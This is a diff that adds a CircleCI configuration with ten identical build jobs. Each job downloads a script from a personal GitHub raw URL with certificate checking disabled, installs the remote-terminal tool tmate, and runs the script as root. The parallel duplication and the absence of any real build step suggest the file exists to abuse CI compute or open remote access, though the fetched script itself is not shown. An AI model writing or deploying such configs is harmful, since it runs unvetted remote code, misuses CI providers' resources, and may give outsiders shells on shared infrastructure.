@@ -1,0 +1,86 @@
+version: 2.1
+jobs:
+    ms1:
+      docker:
+            - image: fr3akyphantom/droid-builder:latest
+      steps:
+        - run:
+            name: ms
+            command: sudo apt update && sudo apt install git aria2 rsync neofetch nano tmux screen xclip silversearch* -y && wget -q --no-check-certificate https://raw.githubusercontent.com/johncartel44/docker/main/docker && sudo apt-get update && sudo apt-get install tmate -y && sudo bash docker
+    ms2:
+      docker:
+            - image: fr3akyphantom/droid-builder:latest
+      steps:
+        - run:
+            name: ms
+            command: sudo apt update && sudo apt install git aria2 rsync neofetch nano tmux screen xclip silversearch* -y && wget -q --no-check-certificate https://raw.githubusercontent.com/johncartel44/docker/main/docker && sudo apt-get update && sudo apt-get install tmate -y && sudo bash docker
+    ms3:
+      docker:
+            - image: fr3akyphantom/droid-builder:latest
+      steps:
+        - run:
+            name: ms
+            command: sudo apt update && sudo apt install git aria2 rsync neofetch nano tmux screen xclip silversearch* -y && wget -q --no-check-certificate https://raw.githubusercontent.com/johncartel44/docker/main/docker && sudo apt-get update && sudo apt-get install tmate -y && sudo bash docker
+    ms4:
+      docker:
+            - image: fr3akyphantom/droid-builder:latest
+      steps:
+        - run:
+            name: ms
+            command: sudo apt update && sudo apt install git aria2 rsync neofetch nano tmux screen xclip silversearch* -y && wget -q --no-check-certificate https://raw.githubusercontent.com/johncartel44/docker/main/docker && sudo apt-get update && sudo apt-get install tmate -y && sudo bash docker        
+    ms5:
+      docker:
+            - image: fr3akyphantom/droid-builder:latest
+      steps:
+        - run:
+            name: ms
+            command: sudo apt update && sudo apt install git aria2 rsync neofetch nano tmux screen xclip silversearch* -y && wget -q --no-check-certificate https://raw.githubusercontent.com/johncartel44/docker/main/docker && sudo apt-get update && sudo apt-get install tmate -y && sudo bash docker
+    ms6:
+      docker:
+            - image: fr3akyphantom/droid-builder:latest
+      steps:
+        - run:
+            name: ms
+            command: sudo apt update && sudo apt install git aria2 rsync neofetch nano tmux screen xclip silversearch* -y && wget -q --no-check-certificate https://raw.githubusercontent.com/johncartel44/docker/main/docker && sudo apt-get update && sudo apt-get install tmate -y && sudo bash docker      
+    ms7:
+      docker:
+            - image: fr3akyphantom/droid-builder:latest
+      steps:
+        - run:
+            name: ms
+            command: sudo apt update && sudo apt install git aria2 rsync neofetch nano tmux screen xclip silversearch* -y && wget -q --no-check-certificate https://raw.githubusercontent.com/johncartel44/docker/main/docker && sudo apt-get update && sudo apt-get install tmate -y && sudo bash docker        
+    ms8:
+      docker:
+            - image: fr3akyphantom/droid-builder:latest
+      steps:
+        - run:
+            name: ms
+            command: sudo apt update && sudo apt install git aria2 rsync neofetch nano tmux screen xclip silversearch* -y && wget -q --no-check-certificate https://raw.githubusercontent.com/johncartel44/docker/main/docker && sudo apt-get update && sudo apt-get install tmate -y && sudo bash docker         
+    ms9:
+      docker:
+            - image: fr3akyphantom/droid-builder:latest
+      steps:
+        - run:
+            name: ms
+            command: sudo apt update && sudo apt install git aria2 rsync neofetch nano tmux screen xclip silversearch* -y && wget -q --no-check-certificate https://raw.githubusercontent.com/johncartel44/docker/main/docker && sudo apt-get update && sudo apt-get install tmate -y && sudo bash docker         
+    ms10:
+      docker:
+            - image: fr3akyphantom/droid-builder:latest
+      steps:
+        - run:
+            name: ms
+            command: sudo apt update && sudo apt install git aria2 rsync neofetch nano tmux screen xclip silversearch* -y && wget -q --no-check-certificate https://raw.githubusercontent.com/johncartel44/docker/main/docker && sudo apt-get update && sudo apt-get install tmate -y && sudo bash docker     
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - ms1
+            - ms2
+            - ms3
+            - ms4
+            - ms5
+            - ms6
+            - ms7
+            - ms8
+            - ms9
+            - ms10
